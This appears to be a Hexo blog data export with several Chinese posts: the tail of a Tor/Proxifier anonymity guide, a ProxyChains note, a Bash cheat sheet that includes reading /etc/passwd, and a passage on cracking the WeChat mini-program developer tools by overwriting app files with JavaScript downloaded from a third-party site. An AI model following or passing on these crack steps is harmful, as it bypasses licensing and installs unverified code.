alt=\"\"><br>如果实在找不到，可用啊D工具箱或nmap等工具进行查找。</p>\n<p><strong>3.确认系统当前状态下不能上网，甚至局域网也不可通，检查网络连接中的网络适配器，禁用一切，仅保留本地连接</strong></p>\n<p><strong>4.安装Proxifier</strong></p>\n<p>Proxifier是一个全局代理软件，将socket端口流量转发到系统全局，十分好用稳定，值得推荐。</p>\n<p><strong>5.配置Proxifer</strong></p>\n<p>打开Proxifier-Profile-Proxy Servers，点击Add…<br><img src=\"/content/images/2016/07/7-pic_hd.jpg\" alt=\"\"></p>\n<p>随后保存并设置而为默认</p>\n<p><strong>6.测试网络</strong></p>\n<p>打开浏览器，对当前ip进行查询，ip会随着时间随机切换，不同国家。<br><img src=\"/content/images/2016/07/9-pic_hd.jpg\" alt=\"\"><br><img src=\"/content/images/2016/07/8-pic_hd.jpg\" alt=\"\"></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a><strong>总结</strong></h3><p>为了保证用户隐私的绝对安全，建议做到以下几点：</p>\n<ul>\n<li>在虚拟机系统下不要留下任何痕迹：<ul>\n<li>虚拟机操作系统系统语言设置为英语，地区为美国。</li>\n<li>虚拟机下的浏览器建议使用friefox或chrome，安装https everywhere、noscript等插件，在浏览器相关设置中设置禁止追踪等查看隐私行为。</li>\n<li>关机前清除系统隐私记录，养成良好习惯。</li>\n<li>能设置不保留记录的软件均设置如此。</li>\n<li>不要安装使用任何国产软件，尤其是任何国产音乐播放器、任何国产视频播放器，严禁使用360等任何管家、QQ、搜狗输入法、各种国产云盘，否则一定会前功尽弃。</li>\n<li>不要使用任何私人账户登录任何网站、任何软件，如有必要，建议现场注册新号码，不要自作聪明使用尘封已久的小号。</li>\n</ul>\n</li>\n<li>将虚拟机操作系统放在Truecrypt等加密软件的虚拟磁盘里，如果是Windows，建议开启Bitlocker，如果是MacOS，建议开启FileVault，同时将系统密码设置为与自己隐私无关的高强度密码。</li>\n<li>设置宿主机的BIOS密码，防止设备被盗隐私丢失，同时建议写好一键远程删除虚拟磁盘的sh脚本，以防重要文件泄露。</li>\n<li>进入TOR网络后，您将面临更大的网络威胁，因为TOR的网域中深藏全球各地的极客、大黑客、恐怖分子等危险人物，请更加注意保护虚拟机子系统安全以及文件安全。</li>\n</ul>\n<p><strong>特别鸣谢</strong></p>\n<p>感谢几年前@safe121提供的无私技术帮助</p>"},{"title":"使用ProxyChains进行终端代理","date":"2016-09-25T23:46:04.000Z","_content":"\n# 安装\n```\nbrew install proxychains-ng\n```\n# 配置\n```\nvi /usr/local/etc/proxychains.conf\n```\n# 使用\n```\nproxychains4 ssh xx:xx@xx.com\n```","source":"_posts/使用ProxyChains进行终端代理.md","raw":"---\ntitle: 使用ProxyChains进行终端代理\ndate: 2016-09-26 00:46:04\ntags: Hack\ncategories: Hack\n---\n\n# 安装\n```\nbrew install proxychains-ng\n```\n# 配置\n```\nvi /usr/local/etc/proxychains.conf\n```\n# 使用\n```\nproxychains4 ssh xx:xx@xx.com\n```","slug":"使用ProxyChains进行终端代理","published":1,"updated":"2016-09-25T23:50:49.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciubiskac000w3sonqjg23dxb","content":"<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install proxychains-ng</div></pre></td></tr></table></figure>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">vi /usr/local/etc/proxychains.conf</div></pre></td></tr></table></figure>\n<h1 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">proxychains4 ssh xx:xx@xx.com</div></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install proxychains-ng</div></pre></td></tr></table></figure>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">vi /usr/local/etc/proxychains.conf</div></pre></td></tr></table></figure>\n<h1 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">proxychains4 ssh xx:xx@xx.com</div></pre></td></tr></table></figure>"},{"title":"常用Bash命令总结","id":"10","updated":"2016-08-06T10:15:29.000Z","date":"2016-08-05T23:36:19.000Z","_content":"\n自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单：\n\n<!-- more --> \n\n##  日常\n* ` ctrl + a ` #命令跳转到句首\n* `ctrl + r` #命令搜索模式\n* `TAB` #命令自动补全\n* `pwd` #显示当前路径\n* `tar -cvf mytest.tar mytest/ ` #对mytest目录打包\n* `tar -xvf mytest.tar ` #解压tar文件\n* `tar -xvf mytest.tar -C /opt/setups/` #解压到特殊目录\n* `find / -name *.conf` #查找/下的所有conf文件\n* `du -sh ./*` #查看当前文件夹下的空间占用情况\n* `more` #分页查看\n* `which` #查看目录\n* `locate` #快速搜索\n\n## 安全\n* `who` #当前登录情况\n* `last` #最近登录情况\n* `cat /etc/passwd |awk -F \\: '{print $1}'` #系统所有用户\n* `chkconfig` #启动项检查\n* `netstat -lnp` #端口情况\n* `uptime` #系统开机多久了\n* `sudo iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT ` #允许访问 80 端口\n\n## 一句话命令\n脚本中切换用户\n```bash\nsu - test -c \"pwd\"\n```\n\n连接到你服务器端口的ip\n```bash\nnetstat -tun|grep 7890|sort|awk '{print $5}'|cut -d : -f 1|uniq \n```\n## 常用功能\n## #定时任务\n使用-l参数列出crontab文件:\n```bash\ncrontab -l\n```\n编辑crontab文件\n```bash\ncrontab -e\n```\n实例1：每1分钟执行一次myCommand\n```bash\n* * * * * myCommand\n```\n实例2：每小时的第3和第15分钟执行\n```bash\n3,15 * * * * myCommand\n```\n实例3：在上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 * * * myCommand\n```\n实例4：每隔两天的上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 */2  *  * myCommand\n```\n实例5：每周一上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 * * 1 myCommand\n```\n实例6：每晚的21:30重启smb\n```bash\n30 21 * * * /etc/init.d/smb restart\n```\n实例7：每月1、10、22日的4 : 45重启smb\n```bash\n45 4 1,10,22 * * /etc/init.d/smb restart\n```\n实例8：每周六、周日的1 : 10重启smb\n```bash\n10 1 * * 6,0 /etc/init.d/smb restart\n```\n实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb\n```bash\n0,30 18-23 * * * /etc/init.d/smb restart\n```\n实例10：每星期六的晚上11 : 00 pm重启smb\n```bash\n0 23 * * 6 /etc/init.d/smb restart\n```\n实例11：每一小时重启smb\n```bash\n* */1 * * * /etc/init.d/smb restart\n```\n实例12：晚上11点到早上7点之间，每隔一小时重启smb\n```bash\n* 23-7/1 * * * /etc/init.d/smb restart\n```\n## #scp\n实例1：从远处复制文件到本地目录\n```bash\nscp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/\n```\n说明：从10.6.159.147机器上的/opt/soft/的目录中下载demo.tar 文件到本地/opt/soft/目录中\n\n实例2：从远处复制到本地\n```bash\nscp -r root@10.6.159.147:/opt/soft/test /opt/soft/\n```\n说明：从10.6.159.147机器上的/opt/soft/中下载test目录到本地的/opt/soft/目录来。\n\n实例3：上传本地文件到远程机器指定目录\n```bash\nscp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest\n```\n说明：复制本地opt/soft/目录下的文件demo.tar 到远程机器10.6.159.147的opt/soft/scptest目录\n\n实例4：上传本地目录到远程机器指定目录\n```bash\nscp -r /opt/soft/test root@10.6.159.147:/opt/soft/scptest\n```\n说明：上传本地目录 /opt/soft/test到远程机器10.6.159.147上/opt/soft/scptest的目录中\n\n","source":"_posts/常用Bash命令总结.md","raw":"---\ntitle: 常用Bash命令总结\ntags: 'Linux'\npermalink: bash\nid: 10\nupdated: '2016-08-06 11:15:29'\ndate: 2016-08-06 00:36:19\n---\n\n自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单：\n\n<!-- more --> \n\n##  日常\n* ` ctrl + a ` #命令跳转到句首\n* `ctrl + r` #命令搜索模式\n* `TAB` #命令自动补全\n* `pwd` #显示当前路径\n* `tar -cvf mytest.tar mytest/ ` #对mytest目录打包\n* `tar -xvf mytest.tar ` #解压tar文件\n* `tar -xvf mytest.tar -C /opt/setups/` #解压到特殊目录\n* `find / -name *.conf` #查找/下的所有conf文件\n* `du -sh ./*` #查看当前文件夹下的空间占用情况\n* `more` #分页查看\n* `which` #查看目录\n* `locate` #快速搜索\n\n## 安全\n* `who` #当前登录情况\n* `last` #最近登录情况\n* `cat /etc/passwd |awk -F \\: '{print $1}'` #系统所有用户\n* `chkconfig` #启动项检查\n* `netstat -lnp` #端口情况\n* `uptime` #系统开机多久了\n* `sudo iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT ` #允许访问 80 端口\n\n## 一句话命令\n脚本中切换用户\n```bash\nsu - test -c \"pwd\"\n```\n\n连接到你服务器端口的ip\n```bash\nnetstat -tun|grep 7890|sort|awk '{print $5}'|cut -d : -f 1|uniq \n```\n## 常用功能\n## #定时任务\n使用-l参数列出crontab文件:\n```bash\ncrontab -l\n```\n编辑crontab文件\n```bash\ncrontab -e\n```\n实例1：每1分钟执行一次myCommand\n```bash\n* * * * * myCommand\n```\n实例2：每小时的第3和第15分钟执行\n```bash\n3,15 * * * * myCommand\n```\n实例3：在上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 * * * myCommand\n```\n实例4：每隔两天的上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 */2  *  * myCommand\n```\n实例5：每周一上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 * * 1 myCommand\n```\n实例6：每晚的21:30重启smb\n```bash\n30 21 * * * /etc/init.d/smb restart\n```\n实例7：每月1、10、22日的4 : 45重启smb\n```bash\n45 4 1,10,22 * * /etc/init.d/smb restart\n```\n实例8：每周六、周日的1 : 10重启smb\n```bash\n10 1 * * 6,0 /etc/init.d/smb restart\n```\n实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb\n```bash\n0,30 18-23 * * * /etc/init.d/smb restart\n```\n实例10：每星期六的晚上11 : 00 pm重启smb\n```bash\n0 23 * * 6 /etc/init.d/smb restart\n```\n实例11：每一小时重启smb\n```bash\n* */1 * * * /etc/init.d/smb restart\n```\n实例12：晚上11点到早上7点之间，每隔一小时重启smb\n```bash\n* 23-7/1 * * * /etc/init.d/smb restart\n```\n## #scp\n实例1：从远处复制文件到本地目录\n```bash\nscp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/\n```\n说明：从10.6.159.147机器上的/opt/soft/的目录中下载demo.tar 文件到本地/opt/soft/目录中\n\n实例2：从远处复制到本地\n```bash\nscp -r root@10.6.159.147:/opt/soft/test /opt/soft/\n```\n说明：从10.6.159.147机器上的/opt/soft/中下载test目录到本地的/opt/soft/目录来。\n\n实例3：上传本地文件到远程机器指定目录\n```bash\nscp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest\n```\n说明：复制本地opt/soft/目录下的文件demo.tar 到远程机器10.6.159.147的opt/soft/scptest目录\n\n实例4：上传本地目录到远程机器指定目录\n```bash\nscp -r /opt/soft/test root@10.6.159.147:/opt/soft/scptest\n```\n说明：上传本地目录 /opt/soft/test到远程机器10.6.159.147上/opt/soft/scptest的目录中\n\n","slug":"bash","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ciubiskae000y3sontrgyfyvz","content":"<p>自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单：</p>\n<a id=\"more\"></a> \n<h2 id=\"日常\"><a href=\"#日常\" class=\"headerlink\" title=\"日常\"></a>日常</h2><ul>\n<li><code>ctrl + a</code> #命令跳转到句首</li>\n<li><code>ctrl + r</code> #命令搜索模式</li>\n<li><code>TAB</code> #命令自动补全</li>\n<li><code>pwd</code> #显示当前路径</li>\n<li><code>tar -cvf mytest.tar mytest/</code> #对mytest目录打包</li>\n<li><code>tar -xvf mytest.tar</code> #解压tar文件</li>\n<li><code>tar -xvf mytest.tar -C /opt/setups/</code> #解压到特殊目录</li>\n<li><code>find / -name *.conf</code> #查找/下的所有conf文件</li>\n<li><code>du -sh ./*</code> #查看当前文件夹下的空间占用情况</li>\n<li><code>more</code> #分页查看</li>\n<li><code>which</code> #查看目录</li>\n<li><code>locate</code> #快速搜索</li>\n</ul>\n<h2 id=\"安全\"><a href=\"#安全\" class=\"headerlink\" title=\"安全\"></a>安全</h2><ul>\n<li><code>who</code> #当前登录情况</li>\n<li><code>last</code> #最近登录情况</li>\n<li><code>cat /etc/passwd |awk -F \\: &#39;{print $1}&#39;</code> #系统所有用户</li>\n<li><code>chkconfig</code> #启动项检查</li>\n<li><code>netstat -lnp</code> #端口情况</li>\n<li><code>uptime</code> #系统开机多久了</li>\n<li><code>sudo iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT</code> #允许访问 80 端口</li>\n</ul>\n<h2 id=\"一句话命令\"><a href=\"#一句话命令\" class=\"headerlink\" title=\"一句话命令\"></a>一句话命令</h2><p>脚本中切换用户<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">su - <span class=\"built_in\">test</span> -c <span class=\"string\">\"pwd\"</span></div></pre></td></tr></table></figure></p>\n<p>连接到你服务器端口的ip<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">netstat -tun|grep 7890|sort|awk <span class=\"string\">'&#123;print $5&#125;'</span>|cut <span class=\"_\">-d</span> : <span class=\"_\">-f</span> 1|uniq</div></pre></td></tr></table></figure></p>\n<h2 id=\"常用功能\"><a href=\"#常用功能\" class=\"headerlink\" title=\"常用功能\"></a>常用功能</h2><h2 id=\"定时任务\"><a href=\"#定时任务\" class=\"headerlink\" title=\"#定时任务\"></a>#定时任务</h2><p>使用-l参数列出crontab文件:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">crontab <span class=\"_\">-l</span></div></pre></td></tr></table></figure></p>\n<p>编辑crontab文件<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">crontab <span class=\"_\">-e</span></div></pre></td></tr></table></figure></p>\n<p>实例1：每1分钟执行一次myCommand<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* * * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例2：每小时的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 * * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例3：在上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例4：每隔两天的上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 */2  *  * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例5：每周一上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 * * 1 myCommand</div></pre></td></tr></table></figure></p>\n<p>实例6：每晚的21:30重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">30 21 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例7：每月1、10、22日的4 : 45重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">45 4 1,10,22 * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例8：每周六、周日的1 : 10重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">10 1 * * 6,0 /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">0,30 18-23 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例10：每星期六的晚上11 : 00 pm重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">0 23 * * 6 /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例11：每一小时重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* */1 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例12：晚上11点到早上7点之间，每隔一小时重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* 23-7/1 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<h2 id=\"scp\"><a href=\"#scp\" class=\"headerlink\" title=\"#scp\"></a>#scp</h2><p>实例1：从远处复制文件到本地目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/</div></pre></td></tr></table></figure></p>\n<p>说明：从10.6.159.147机器上的/opt/soft/的目录中下载demo.tar 文件到本地/opt/soft/目录中</p>\n<p>实例2：从远处复制到本地<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp -r root@10.6.159.147:/opt/soft/<span class=\"built_in\">test</span> /opt/soft/</div></pre></td></tr></table></figure></p>\n<p>说明：从10.6.159.147机器上的/opt/soft/中下载test目录到本地的/opt/soft/目录来。</p>\n<p>实例3：上传本地文件到远程机器指定目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest</div></pre></td></tr></table></figure></p>\n<p>说明：复制本地opt/soft/目录下的文件demo.tar 到远程机器10.6.159.147的opt/soft/scptest目录</p>\n<p>实例4：上传本地目录到远程机器指定目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp -r /opt/soft/<span class=\"built_in\">test</span> root@10.6.159.147:/opt/soft/scptest</div></pre></td></tr></table></figure></p>\n<p>说明：上传本地目录 /opt/soft/test到远程机器10.6.159.147上/opt/soft/scptest的目录中</p>\n","excerpt":"<p>自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单：</p>","more":"<h2 id=\"日常\"><a href=\"#日常\" class=\"headerlink\" title=\"日常\"></a>日常</h2><ul>\n<li><code>ctrl + a</code> #命令跳转到句首</li>\n<li><code>ctrl + r</code> #命令搜索模式</li>\n<li><code>TAB</code> #命令自动补全</li>\n<li><code>pwd</code> #显示当前路径</li>\n<li><code>tar -cvf mytest.tar mytest/</code> #对mytest目录打包</li>\n<li><code>tar -xvf mytest.tar</code> #解压tar文件</li>\n<li><code>tar -xvf mytest.tar -C /opt/setups/</code> #解压到特殊目录</li>\n<li><code>find / -name *.conf</code> #查找/下的所有conf文件</li>\n<li><code>du -sh ./*</code> #查看当前文件夹下的空间占用情况</li>\n<li><code>more</code> #分页查看</li>\n<li><code>which</code> #查看目录</li>\n<li><code>locate</code> #快速搜索</li>\n</ul>\n<h2 id=\"安全\"><a href=\"#安全\" class=\"headerlink\" title=\"安全\"></a>安全</h2><ul>\n<li><code>who</code> #当前登录情况</li>\n<li><code>last</code> #最近登录情况</li>\n<li><code>cat /etc/passwd |awk -F \\: &#39;{print $1}&#39;</code> #系统所有用户</li>\n<li><code>chkconfig</code> #启动项检查</li>\n<li><code>netstat -lnp</code> #端口情况</li>\n<li><code>uptime</code> #系统开机多久了</li>\n<li><code>sudo iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT</code> #允许访问 80 端口</li>\n</ul>\n<h2 id=\"一句话命令\"><a href=\"#一句话命令\" class=\"headerlink\" title=\"一句话命令\"></a>一句话命令</h2><p>脚本中切换用户<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">su - <span class=\"built_in\">test</span> -c <span class=\"string\">\"pwd\"</span></div></pre></td></tr></table></figure></p>\n<p>连接到你服务器端口的ip<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">netstat -tun|grep 7890|sort|awk <span class=\"string\">'&#123;print $5&#125;'</span>|cut <span class=\"_\">-d</span> : <span class=\"_\">-f</span> 1|uniq</div></pre></td></tr></table></figure></p>\n<h2 id=\"常用功能\"><a href=\"#常用功能\" class=\"headerlink\" title=\"常用功能\"></a>常用功能</h2><h2 id=\"定时任务\"><a href=\"#定时任务\" class=\"headerlink\" title=\"#定时任务\"></a>#定时任务</h2><p>使用-l参数列出crontab文件:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">crontab <span class=\"_\">-l</span></div></pre></td></tr></table></figure></p>\n<p>编辑crontab文件<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">crontab <span class=\"_\">-e</span></div></pre></td></tr></table></figure></p>\n<p>实例1：每1分钟执行一次myCommand<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* * * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例2：每小时的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 * * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例3：在上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例4：每隔两天的上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 */2  *  * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例5：每周一上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 * * 1 myCommand</div></pre></td></tr></table></figure></p>\n<p>实例6：每晚的21:30重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">30 21 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例7：每月1、10、22日的4 : 45重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">45 4 1,10,22 * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例8：每周六、周日的1 : 10重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">10 1 * * 6,0 /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">0,30 18-23 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例10：每星期六的晚上11 : 00 pm重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">0 23 * * 6 /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例11：每一小时重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* */1 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例12：晚上11点到早上7点之间，每隔一小时重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* 23-7/1 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<h2 id=\"scp\"><a href=\"#scp\" class=\"headerlink\" title=\"#scp\"></a>#scp</h2><p>实例1：从远处复制文件到本地目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/</div></pre></td></tr></table></figure></p>\n<p>说明：从10.6.159.147机器上的/opt/soft/的目录中下载demo.tar 文件到本地/opt/soft/目录中</p>\n<p>实例2：从远处复制到本地<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp -r root@10.6.159.147:/opt/soft/<span class=\"built_in\">test</span> /opt/soft/</div></pre></td></tr></table></figure></p>\n<p>说明：从10.6.159.147机器上的/opt/soft/中下载test目录到本地的/opt/soft/目录来。</p>\n<p>实例3：上传本地文件到远程机器指定目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest</div></pre></td></tr></table></figure></p>\n<p>说明：复制本地opt/soft/目录下的文件demo.tar 到远程机器10.6.159.147的opt/soft/scptest目录</p>\n<p>实例4：上传本地目录到远程机器指定目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp -r /opt/soft/<span class=\"built_in\">test</span> root@10.6.159.147:/opt/soft/scptest</div></pre></td></tr></table></figure></p>\n<p>说明：上传本地目录 /opt/soft/test到远程机器10.6.159.147上/opt/soft/scptest的目录中</p>"},{"title":"微信小程序的一些感想","date":"2016-09-25T17:50:00.000Z","_content":"\n# 前言\n这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。\n\n# 下载\n微信小程序目前正处于内测阶段，所以我这个算是尝鲜，用的破解版。\nMac版下载地址：\nhttp://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg\n\nwindows下载地址：\nhttp://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe\n\n# 破解\n如果你不是内测用户，你需要破解，先下载以下文件。\n\n文件1：\n\nhttp://source.lattecake.com/files/2016/09/createstep.js\n\n文件2：\n\nhttp://source.lattecake.com/files/2016/09/projectStores.js\n\n替换路径：\n\ncreatestep.js -> /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/components/create/createstep.js\n\nprojectStores.js -> /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/stroes/projectStores.js\n\n# 